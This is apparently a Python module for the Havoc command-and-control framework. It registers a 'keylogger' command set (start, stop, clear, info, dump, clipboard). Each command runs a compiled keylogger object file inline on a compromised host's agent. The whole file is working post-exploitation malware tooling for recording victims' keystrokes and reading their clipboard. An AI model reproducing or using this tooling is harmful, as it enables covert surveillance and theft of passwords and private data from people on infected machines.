from havoc import Demon, RegisterCommand, RegisterModule

BOF_PATH = "./bin/keylogger.x64.o"

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4


def start(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("start")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def stop(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("stop")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def clear(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("clear")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def info(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("info")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def dump(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("dump")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def clipboard(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("clipboard")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

RegisterModule("keylogger", "log typed keystrokes", "", "[command] (args)", "", "")
RegisterCommand(start, "keylogger", "start", "start the keylogger", 0, "", "")
RegisterCommand(stop, "keylogger", "stop", "stop the keylogger", 0, "", "")
RegisterCommand(clear, "keylogger", "clear", "clear the recorded keystrokes", 0, "", "")
RegisterCommand(info, "keylogger", "info", "print general information about the keylogger", 0, "", "")
RegisterCommand(dump, "keylogger", "dump", "print recorded keystrokes", 0, "", "")
RegisterCommand(clipboard, "keylogger", "clipboard", "get the content of the clipboard", 0, "", "")
